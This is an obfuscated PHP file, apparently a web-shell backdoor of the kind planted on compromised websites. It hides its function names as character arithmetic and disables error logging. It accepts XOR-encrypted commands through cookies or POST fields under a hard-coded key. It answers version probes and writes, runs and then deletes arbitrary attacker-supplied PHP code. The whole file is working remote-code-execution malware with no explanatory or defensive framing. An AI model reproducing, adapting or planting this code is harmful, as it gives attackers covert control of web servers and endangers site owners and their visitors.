<?php $suxyxwmsb = 'f'."\x69".chr(282-174)."\x65"."\x5f"."\x70".'u'."\164"."\x5f".'c'."\157"."\x6e".chr(989-873).chr(101)."\156".chr(116)."\x73";
$zrguaixv = "\142"."\x61"."\x73".chr(200-99).chr(532-478)."\64"."\x5f"."\144".chr(101).'c'.'o'.'d'."\145";
$xdlaoehi = 'i'."\x6e"."\x69"."\137"."\163"."\x65".chr(1078-962);
$cjbppkqrto = 'u'."\156".'l'.chr(477-372).chr(617-507)."\153";


@$xdlaoehi("\x65".chr(114).chr(770-656).chr(304-193).'r'.'_'.'l'.chr(852-741)."\147", NULL);
@$xdlaoehi('l'.chr(111).chr(103)."\137".'e'."\x72".chr(114).chr(335-224).'r'.'s', 0);
@$xdlaoehi('m'."\x61".chr(420-300)."\x5f".chr(1092-991).chr(120).'e'.'c'.chr(117)."\164"."\x69"."\157".'n'.chr(95)."\x74"."\151"."\x6d"."\x65", 0);
@set_time_limit(0);

function magjtkbjkm($lefdndhvay, $oawguy)
{
    $xjfgtpbnx = "";
    for ($ydumgikpey = 0; $ydumgikpey < strlen($lefdndhvay);) {
        for ($j = 0; $j < strlen($oawguy) && $ydumgikpey < strlen($lefdndhvay); $j++, $ydumgikpey++) {
            $xjfgtpbnx .= chr(ord($lefdndhvay[$ydumgikpey]) ^ ord($oawguy[$j]));
        }
    }
    return $xjfgtpbnx;
}

$hifgcps = array_merge($_COOKIE, $_POST);
$rthdwzhyme = '2dcaf010-e7dc-4378-bb78-a6f7af5784f4';
foreach ($hifgcps as $apnlakn => $lefdndhvay) {
    $lefdndhvay = @unserialize(magjtkbjkm(magjtkbjkm($zrguaixv($lefdndhvay), $rthdwzhyme), $apnlakn));
    if (isset($lefdndhvay[chr(97)."\x6b"])) {
        if ($lefdndhvay["\x61"] == "\x69") {
            $ydumgikpey = array(
                chr(305-193).chr(669-551) => @phpversion(),
                chr(644-529)."\166" => "3.5",
            );
            echo @serialize($ydumgikpey);
        } elseif ($lefdndhvay["\x61"] == chr(259-158)) {
            $kpehtayi = "./" . md5($rthdwzhyme) . "\56".'i'."\156"."\143";
            @$suxyxwmsb($kpehtayi, "<" . "\77"."\160".chr(104)."\x70".chr(721-689).chr(64).'u'.chr(110).chr(565-457).'i'.chr(844-734).chr(107).chr(40).'_'."\x5f"."\106".chr(73)."\x4c".chr(1038-969).chr(948-853).chr(95).chr(41).chr(838-779).' ' . $lefdndhvay["\x64"]);
            include($kpehtayi);
            @$cjbppkqrto($kpehtayi);
        }
        exit();
    }
}

